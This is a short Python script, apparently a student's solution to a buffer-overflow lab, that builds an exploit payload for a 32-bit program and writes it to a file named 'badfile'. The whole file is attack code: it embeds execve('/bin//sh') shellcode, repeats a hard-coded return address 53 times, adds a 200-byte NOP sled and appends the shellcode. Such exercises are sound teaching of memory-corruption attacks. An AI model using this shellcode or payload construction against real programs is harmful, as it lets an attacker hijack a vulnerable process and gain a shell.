#!/usr/bin/python3
import sys

# Shellcode for a 32bit architecture
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Initialize your payload.
payload = bytearray()
##################################################################
# Put the shellcode somewhere in the payload


# Pick a return address within your payload
return_address = 0xffffcebc

# gdb deepens the stack, by adding metedata to 
# help with debugging. To accommodate for this
# we will add an offset to return_address. 
return_address += 200


# store the 4 byte return address at the appropriate
# index in the payload in little-endian byte order.
# you can use the to_bytes() function to accomplish this. 

little_e = (return_address).to_bytes(4, byteorder='little')
length = len(little_e)

for i in range(53):
    payload += little_e
for i in range(200):
    payload += 0x90.to_bytes(1, byteorder='little')
##################################################################

payload += shellcode

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(payload)
